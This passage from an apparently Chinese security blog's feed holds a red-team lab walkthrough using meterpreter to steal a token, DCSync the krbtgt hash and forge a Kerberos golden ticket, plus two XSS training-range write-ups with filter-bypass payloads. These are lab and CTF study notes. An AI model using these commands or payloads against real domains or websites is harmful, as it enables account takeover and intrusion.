class="line">[!] Running as SYSTEM, function will not work.</span><br></pre></td></tr></table></figure><p>出现这种情况，我们需要伪造administrator，然后再执行<code>dcsync_ntlm krbtgt</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; steal_token 1952</span><br><span class="line">Stolen token with username: DEMO\administrator</span><br><span class="line">meterpreter &gt; dcsync_ntlm krbtgt</span><br><span class="line">[+] Account   : krbtgt</span><br><span class="line">[+] NTLM Hash : 7c4ed692473d4b4344c3ba01c5e6cb63</span><br><span class="line">[+] LM Hash   : 4d81a5d6b591f0710e75884e5ef9cba2</span><br><span class="line">[+] SID       : S-1-5-21-979886063-1111900045-1414766810-502</span><br><span class="line">[+] RID       : 502</span><br></pre></td></tr></table></figure><p><code>golden_ticket_create</code>构造黄金票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; golden_ticket_create -d demo.com -u Administrator -s S-1-5-21-979886063-1111900045-1414766810 -k 7c4ed692473d4b4344c3ba01c5e6cb63 -t &#x2F;home&#x2F;kali&#x2F;kali.tck</span><br><span class="line">[+] Golden Kerberos ticket written to &#x2F;home&#x2F;kali&#x2F;kali.tck</span><br><span class="line"></span><br><span class="line">参数介绍</span><br><span class="line">-t &#x2F;home&#x2F;kali&#x2F;kali.tck</span><br><span class="line">-d  域名</span><br><span class="line">-u  要伪造的用户</span><br><span class="line">-s  域SID</span><br><span class="line">-k  krbtge的ntlm</span><br><span class="line">-t  保存的本地路径</span><br></pre></td></tr></table></figure><p>导入黄金票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eter &gt; kerberos_ticket_use &#x2F;home&#x2F;kali&#x2F;kali.tck</span><br><span class="line">[*] Using Kerberos ticket stored in &#x2F;home&#x2F;kali&#x2F;kali.tck, 1820 bytes ...</span><br><span class="line">[+] Kerberos ticket applied successfully.</span><br></pre></td></tr></table></figure><p>查看域控的c盘根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;dir \\WIN-ENS2VR5TR3N\c$</span><br><span class="line">dir \\WIN-ENS2VR5TR3N\c$</span><br><span class="line"> Volume in drive \\WIN-ENS2VR5TR3N\c$ has no label.</span><br><span class="line"> Volume Serial Number is 702B-0D1B</span><br><span class="line"></span><br><span class="line"> Directory of \\WIN-ENS2VR5TR3N\c$</span><br><span class="line"></span><br><span class="line">2009&#x2F;07&#x2F;14  11:20    &lt;DIR&gt;          PerfLogs</span><br><span class="line">2020&#x2F;01&#x2F;24  13:30    &lt;DIR&gt;          Program Files</span><br><span class="line">2020&#x2F;01&#x2F;24  13:30    &lt;DIR&gt;          Program Files (x86)</span><br><span class="line">2020&#x2F;05&#x2F;16  11:39            48,640 update.exe</span><br><span class="line">2019&#x2F;12&#x2F;31  11:01    &lt;DIR&gt;          Users</span><br><span class="line">2020&#x2F;01&#x2F;24  13:33    &lt;DIR&gt;          Windows</span><br><span class="line">               1 File(s)         48,640 bytes</span><br><span class="line">               5 Dir(s)  12,438,585,344 bytes free</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Vulnstack是红日安全团队出品的一个实战环境，本次测试的红日安全 ATT&amp;amp;CK实战系列——红队评估（四）靶场环境，下载地址：&lt;
      
    
    </summary>
    
    
      <category term="实战" scheme="http://mysecroad.github.io/categories/%E5%AE%9E%E6%88%98/"/>
    
    
      <category term="实战" scheme="http://mysecroad.github.io/tags/%E5%AE%9E%E6%88%98/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-2555复现</title>
    <link href="http://mysecroad.github.io/posts/36799.html"/>
    <id>http://mysecroad.github.io/posts/36799.html</id>
    <published>2020-05-12T12:42:45.000Z</published>
    <updated>2020-12-07T06:14:12.378Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章！</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="91a79403fed95211882ae30e21194868a106fc5e8032c03176f045ba9141626a"></script>  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      输入密码，查看文章！
    
    </summary>
    
    
      <category term="漏洞复现" scheme="http://mysecroad.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞复现" scheme="http://mysecroad.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="CVE" scheme="http://mysecroad.github.io/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>XSS靶场练习二</title>
    <link href="http://mysecroad.github.io/posts/6855.html"/>
    <id>http://mysecroad.github.io/posts/6855.html</id>
    <published>2020-05-04T09:39:19.000Z</published>
    <updated>2020-05-04T13:08:57.300Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><a href="http://test.ctf8.com/" target="_blank" rel="noopener">http://test.ctf8.com/</a></p><p><img src="/posts/6855/1.png" alt></p><h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p>name变量通过<code>GET</code>方式传入，直接带入到标签中，没有任何过滤。</p><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>将第一关的payload带进去，发现输入值被原封不动的输出了。查看页面源代码</p><p><img src="/posts/6855/2.png" alt></p><p>发现输入的<code>&lt;、&gt;</code>被<code>html</code>编码了。</p><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p>输入点(INPUT_POINT)有两处，一处在标签间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align&#x3D;&quot;center&quot;&gt;没有找到和INPUT_POINT相关的结果.&lt;&#x2F;h2&gt;</span><br></pre></td></tr></table></figure><p>另一处在标签属性处</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name&#x3D;&quot;keyword&quot; value&#x3D;&quot;INPUT_POINT&quot;&gt;</span><br></pre></td></tr></table></figure><p>对左右尖括号<code>&lt;,&gt;</code>被转化成<code>HTML</code>字符实体(HTML Entity)的情况，想直接构造标签是有难度的(宽字符构造尖括号?)所以从另一处入手。<br>输入点位于属性内，所以闭合属性并构造新属性，基于事件弹窗。<br>(然而如果输入点对&lt;,&gt;,’,”都进行了字符实体转换呢)<br>(构造标签的关键是&lt;,&gt;, 闭合属性的关键是引号)</p><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; onclick&#x3D;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p>和 level 3 输出点一致</p><p>只是level 3中<code>value=&#39;&#39;</code>，而level 4中的<code>value=&quot;&quot;</code>，所以要闭合<code>value</code>上面要用<code>&#39;</code>，此处要用<code>&quot;</code></p><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick&#x3D;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p><img src="/posts/6855/3.png" alt></p><p><code>on</code> 替换为 <code>o_n</code>，<code>script</code> 替换为 <code>sc_ript</code><br>因此不能再考虑用事件触发，也不能用<code>script</code>标签触发。</p><p><strong>payload</strong></p><p>此处的用<code>&quot;&gt;</code>截断属性，再用a标签触发<br>关键在于虽然在h5的内容过滤了，但在属性内未过滤<code>&quot;&gt;</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a href&#x3D;&quot;javascript:%61lert(1)&quot;&gt;click me&lt;&#x2F;a&gt; &#x2F;&#x2F;</span><br><span class="line">&quot;&gt; &lt;a href&#x3D;&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;111&lt;&#x2F;a&gt; &#x2F;&#x2F;</span><br><span class="line">&quot;&gt; &lt;a href&#x3D;&quot;javascript:alert(&#x2F;1&#x2F;)&quot;&gt;axxx&lt;&#x2F;a&gt; &#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>在上一关限制的基础上，将所有的属性，如<code>src</code>、<code>href</code>等等都进行转换。</p><p>此处可用大小写混合绕过。</p><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a Href&#x3D;&quot;javascript:alert(&#x2F;1&#x2F;)&quot;&gt;axxx&lt;&#x2F;a&gt;</span><br><span class="line">&quot;&gt; &lt;Script&gt;alert(&#39;handsome boy&#39;)&lt;&#x2F;script&gt; &#x2F;&#x2F;</span><br><span class="line">&quot;&gt; &lt;img Src&#x3D;x OnError&#x3D;alert(&#39;xss&#39;)&gt; &#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p><code>href</code>, <code>on</code>, <code>script</code>等关键字被删除了。</p><p>此处可用双写关键字绕过</p><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot; oonninput&#x3D;alert(1) &quot;</span><br><span class="line">&quot;&gt; &lt;scscriptript&gt;alert&#96;xss&#96;&lt;&#x2F;scscriptript&gt; &#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p>属性中双引号被转换成<code>HTML</code>实体，无法截断属性。<br>由于<code>script</code>关键字被过滤，得考虑绕过方式，使用<code>HTML</code>实体字符绕过<br><code>HTML16</code>编码<br><code>HTML10</code>编码</p><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(&#x2F;1&#x2F;)</span><br><span class="line">javascript:%61lert(1)</span><br><span class="line">javasc&amp;#x72;ipt:alert&#96;1&#96;</span><br><span class="line">javasc&amp;#x0072;ipt:alert&#96;1&#96;</span><br></pre></td></tr></table></figure><h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p>提交参数中必须要有http关键字</p><p><strong>payload</strong></p><p><strong>记得替换<code>script</code>，比如用<code>&amp;#x72;</code>替换r</strong><br><code>%0d</code>和<code>%0a</code>,<code>/</code>等有时具有替代空格的作用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(1)&#x2F;&#x2F;http:&#x2F;&#x2F;www.0aa.me  &#x2F;&#x2F;利用注释</span><br><span class="line">javascript:%0dhttp:&#x2F;&#x2F;www.0aa.me%0dalert(1)  &#x2F;&#x2F;不能用注释的情况下</span><br></pre></td></tr></table></figure><h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p>可以看出这里<code>keyword</code>变量依然没戏，被<code>HTML</code>实体化输出了出来，所以重点放在<code>t_sort</code>变量上，只过滤了尖括号，然后就直接输出到了标签中，所以这里可以尝试直接在标签中闭合构造事件来弹窗，还得注意一点就是这里的标签使用了<code>type=&quot;hidden&quot;</code>将输入框隐藏了起来，可以手动赋值<code>type</code>的值来覆盖掉先前的属性来达到显示文本框的目的。</p><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword&#x3D;233&amp;t_sort&#x3D;&quot; type&#x3D;&quot;&quot; onclick&#x3D;alert(&#39;XSS&#39;) &#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><p>与 level 10 类似，寻找新的注入点。<br>原来的<code>t_sort</code>的双引号被过滤了。<br>这次注入点是在 <code>HTTP Request Header</code> 请求头的 <code>Refer</code> 字段。</p><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; type&#x3D;&quot;text&quot; onmouseover&#x3D;alert&#96;1&#96; &quot;</span><br></pre></td></tr></table></figure><h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><p>这一题和上一题类似，只是这里的漏洞点出现在了<code>HTTP</code>请求头的<code>User-Agent</code>。</p><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &quot; type&#x3D;&quot;&quot; onclick&#x3D;alert(&#39;XSS&#39;) &#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h2><p>寻找新的注入点，这次是利用<code>cookie</code>中的参数注入。</p><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: user&#x3D;&quot; type&#x3D;&quot;&quot; onclick&#x3D;alert(&#39;XSS&#39;) &#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h2><p>看了先知的wp，才知道是图片exif 藏有xss payload。<a href="https://xianzhi.aliyun.com/forum/read/1462.html?page=2" target="_blank" rel="noopener">https://xianzhi.aliyun.com/forum/read/1462.html?page=2</a></p><h2 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h2><p>这题考察<code>Angular JS</code> 的<code>ng-include</code>用法，具体可以参考这篇资料：<a href="http://www.runoob.com/angularjs/ng-ng-include.html" target="_blank" rel="noopener">AngularJS ng-include 指令</a></p><p><strong>ng-include</strong> 指令用于包含外部的 HTML 文件，包含的内容将作为指定元素的子节点。<code>ng-include</code> 属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一个域名下。所以这里就用来包含其他关的页面来触发弹窗。</p><p>发现可以包含第一关的页面</p><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src&#x3D;‘level1.php?name&#x3D;&lt;img src&#x3D;x onerror&#x3D;alert(1)&gt;‘</span><br></pre></td></tr></table></figure><h2 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h2><p>这里过滤掉了script标签，可以尝试使用其他标签通过事件来弹窗，但是也过滤了空格。</p><p>可以使用如下符号替代空格</p><p><img src="/posts/6855/4.png" alt></p><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword&#x3D;&lt;img%0asrc&#x3D;x%0aonerror&#x3D;alert(&#39;XSS&#39;)&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://test.ctf8.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://
      
    
    </summary>
    
    
      <category term="WEB" scheme="http://mysecroad.github.io/categories/WEB/"/>
    
    
      <category term="XSS" scheme="http://mysecroad.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>XSS靶场练习一</title>
    <link href="http://mysecroad.github.io/posts/32710.html"/>
    <id>http://mysecroad.github.io/posts/32710.html</id>
    <published>2020-05-02T12:54:12.000Z</published>
    <updated>2020-05-06T02:22:51.963Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>靶场地址：<a href="https://alf.nu/alert1" target="_blank" rel="noopener">alert(1) to win</a></p><h2 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span>+s+<span class="string">'");&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>代码将输入直接拼接到了返回的字符串中，没有任何过滤，直接闭合<code>console.log(&quot;</code>即可。</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">13个字符</span><br><span class="line">&quot;);alert(1)&#x2F;&#x2F;</span><br><span class="line">12个字符</span><br><span class="line">&quot;);alert(1,&quot;</span><br></pre></td></tr></table></figure><h2 id="Adobe"><a href="#Adobe" class="headerlink" title="Adobe"></a>Adobe</h2><h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  s &#x3D; s.replace(&#x2F;&quot;&#x2F;g, &#39;\\&quot;&#39;);</span><br><span class="line">  return &#39;&lt;script&gt;console.log(&quot;&#39; + s + &#39;&quot;);&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p><img src="/posts/32710/1.png" alt="replace"></p><p>代码将输入的双引号加了一个<code>\</code>进行了转义，这样我们就不能像第一题那样闭合<code>console.log</code>了，但是没啥影响，有两种方法：</p><ul><li>闭合之前的<code>&lt;script&gt;</code>，然后再写一个<code>&lt;script&gt;</code></li><li>使用<code>\</code>来转义对<code>&quot;</code>进行转义的<code>\</code>，从而绕过对<code>&quot;</code>的过滤</li></ul><h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">方法一</span><br><span class="line">&lt;&#x2F;script&gt;&lt;script&gt;alert(1)&#x2F;&#x2F;</span><br><span class="line">方法二</span><br><span class="line">\&quot;);alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h2><h3 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  s &#x3D; JSON.stringify(s);</span><br><span class="line">  return &#39;&lt;script&gt;console.log(&#39; + s + &#39;);&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p><img src="/posts/32710/2.png" alt="JSON.stringify"></p><p>代码将输入使用<code>JSON.stringify</code>进行了处理，与第二题的方法一思路相同。</p><h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;script&gt;&lt;script&gt;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="Markdown"><a href="#Markdown" class="headerlink" title="Markdown"></a>Markdown</h2><h3 id="源码-3"><a href="#源码-3" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  var text &#x3D; s.replace(&#x2F;&lt;&#x2F;g, &#39;&lt;&#39;).replace(&#x2F;&quot;&#x2F;g, &#39;&quot;&#39;);</span><br><span class="line">  &#x2F;&#x2F; URLs</span><br><span class="line">  text &#x3D; text.replace(&#x2F;(http:\&#x2F;\&#x2F;\S+)&#x2F;g, &#39;&lt;a href&#x3D;&quot;$1&quot;&gt;$1&lt;&#x2F;a&gt;&#39;);</span><br><span class="line">  &#x2F;&#x2F; [[img123|Description]]</span><br><span class="line">  text &#x3D; text.replace(&#x2F;\[\[(\w+)\|(.+?)\]\]&#x2F;g, &#39;&lt;img alt&#x3D;&quot;$2&quot; src&#x3D;&quot;$1.gif&quot;&gt;&#39;);</span><br><span class="line">  return text;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>代码进行了三步操作</p><ol><li>第一步，将<code>&lt;</code>和<code>&quot;</code>转成了HTML实体</li><li>第二步，如果存在<code>http://</code>的字符串， 会可以生成一个<code>a</code>标签</li><li>第三步，解析Markdown的图片的语法，如果存在<code>[[img123|Description]]</code>格式的字符串，则变为``。</li></ol><p>开头对<code>&quot;</code>和<code>&lt;</code>进行了编码操作，所以不能直接传入<code>&quot;</code>来闭合，当前思路就是构造一个字符串，使其满足后两个正则，从而引入<code>a</code>标签中的<code>&quot;</code>，从而闭合<code>img</code>标签的<code>alt</code>属性。</p><h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[[a|http:&#x2F;&#x2F;onerror&#x3D;alert(1)&#x2F;&#x2F;]]</span><br></pre></td></tr></table></figure><h2 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h2><h3 id="源码-4"><a href="#源码-4" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">    &#x2F;&#x2F; Slightly too lazy to make two input fields.</span><br><span class="line">    &#x2F;&#x2F; Pass in something like &quot;TextNode#foo&quot;</span><br><span class="line">    var m &#x3D; s.split(&#x2F;#&#x2F;);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Only slightly contrived at this point.</span><br><span class="line">    var a &#x3D; document.createElement(&#39;div&#39;);</span><br><span class="line">    a.appendChild(document[&#39;create&#39; + m[0]].apply(document, m.slice(1)));</span><br><span class="line">    return a.innerHTML;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>代码实现了一个根据输入来创建的<code>DOM</code>节点的功能。<br>如果输入是<code>TextNode#foo</code>，那么执行的代码就是<code>document.createTextNode(&quot;foo&quot;)</code>。</p><p><strong>常用命令</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">createElement() 创建一个元素节点</span><br><span class="line">createTextNode() 创建一个文本节点</span><br><span class="line">createAttribute() 创建一个属性节点</span><br><span class="line">createComment() 创建一个注释节点</span><br></pre></td></tr></table></figure><p>经过尝试，通过<code>createComment()</code>创建一个注释节点，然后闭合注释可以达到代码执行的目的。</p><h3 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">34个字符</span><br><span class="line">Comment#&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br><span class="line">32个字符</span><br><span class="line">Comment#&gt;&lt;iframe onload&#x3D;alert(1)</span><br></pre></td></tr></table></figure><h2 id="Callback"><a href="#Callback" class="headerlink" title="Callback"></a>Callback</h2><h3 id="源码-5"><a href="#源码-5" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  &#x2F;&#x2F; Pass inn &quot;callback#userdata&quot;</span><br><span class="line">  var thing &#x3D; s.split(&#x2F;#&#x2F;); </span><br><span class="line"></span><br><span class="line">  if (!&#x2F;^[a-zA-Z\[\]&#39;]*$&#x2F;.test(thing[0])) return &#39;Invalid callback&#39;;</span><br><span class="line">  var obj &#x3D; &#123;&#39;userdata&#39;: thing[1] &#125;;</span><br><span class="line">  var json &#x3D; JSON.stringify(obj).replace(&#x2F;&lt;&#x2F;g, &#39;\\u003c&#39;);</span><br><span class="line">  return &quot;&lt;script&gt;&quot; + thing[0] + &quot;(&quot; + json +&quot;)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>代码首先将输入的字符串按照<code>#</code>分割为两部分，第一部分是回调函数，只能使用大小写字母、<code>[</code>、<code>]</code>、<code>&#39;</code>，第二部分是<code>JSON</code>数据。<br>而且后面又将<code>JSON</code>数据中的尖括号转义成了<code>\\u003c</code>。<br>最终的目的依旧是执行<code>JS</code>代码，<code>thing[0]</code>部分不一定是一个函数，只要满足要求就OK。<br>既然回调函数名部分和后面的值都没有过滤单引号，可以在前后放两个单引号，从而闭合它们之间的值。再加个分号作为分割，后面就好操作了。</p><h3 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;#&#39;;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="Skandia"><a href="#Skandia" class="headerlink" title="Skandia"></a>Skandia</h2><h3 id="源码-6"><a href="#源码-6" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  return &#39;&lt;script&gt;console.log(&quot;&#39; + s.toUpperCase() + &#39;&quot;)&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-6"><a 